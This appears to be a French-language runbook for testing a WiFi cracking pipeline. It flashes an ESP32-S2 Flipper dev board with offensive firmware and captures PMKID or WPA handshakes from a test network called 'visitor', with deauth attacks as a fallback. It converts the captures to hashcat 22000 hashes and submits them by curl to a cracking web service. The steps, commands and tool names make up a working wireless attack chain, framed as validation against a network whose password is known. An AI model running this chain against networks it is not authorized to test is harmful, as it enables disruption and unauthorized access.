# M1 — Runbook de capture (à exécuter dès que la dev board est sur son USB)

**Pré-requis matériel (bloquant)** : brancher l'**USB-C propre de la dev board ESP32-S2**
sur un PC (Bruxelles). Elle peut rester montée sur le Flipper — c'est un 2e câble, du port
USB-C de la carte vers le PC. Le Flipper seul (GPIO) ne suffit pas : l'archi n'utilise pas
le Flipper dans le flux de données.

## Étape 1 — Détecter la puce (non destructif)
Sur Bruxelles (esptool 5.3.0 déjà présent) :
```
python -m esptool --port COMxx chip_id
python -m esptool --port COMxx flash_id
```
→ confirme ESP32-S2, taille de flash. Repérer le nouveau COM (Espressif VID `303A`, ou un
CP210x `10C4` / CH340 `1A86` selon la révision de carte).

## Étape 2 — Firmware de capture (décision à figer)
Deux candidats (voir spec §4.1) :
- **ESP32 Marauder** (build « Flipper WiFi devboard » ESP32-S2) : CLI série `sniffpmkid`,
  `attack -t deauth`, `sniffraw` ; sauvegarde pcap sur SD.
- **ESP32 WiFi Penetration Tool** (Risinek) : PMKID + handshake + deauth, sortie PCAP.

⚠️ Choisir/flasher **après** l'étape 1 (variante = puce détectée). Ne pas flasher à l'aveugle.
Sauvegarder d'abord le firmware existant : `esptool --port COMxx read_flash 0 ALL backup.bin`.

## Étape 3 — Capturer le réseau de test « visitor »
- Cibler le BSSID/canal de **visitor**, tenter **PMKID** d'abord, repli **handshake+deauth**.
- Récupérer le `.pcap` (série ou SD).

## Étape 4 — pcap → hash 22000
Sur le PC/téléphone : `hcxpcapngtool -o capture.22000 capture.pcap` (paquet hcxtools).
Vérifier qu'une ligne `WPA*01*...` (PMKID) ou `WPA*02*...` (EAPOL) est produite.

## Étape 5 — Soumettre au webservice et cracker
```
curl -X POST https://wifitest.zitoon.com/jobs \
  -H "Authorization: Bearer <PHONE_TOKEN>" -H "Content-Type: application/json" \
  -d '{"hash_22000":"<ligne 22000>","ssid":"visitor"}'
```
Lancer un worker avec une wordlist contenant le mot de passe connu (validation) → `found`.

> Le mot de passe de « visitor » est connu (fourni par Val) : mettre dans la wordlist de
> test pour **valider la chaîne capture→crack** sans dépendre d'un gros GPU.
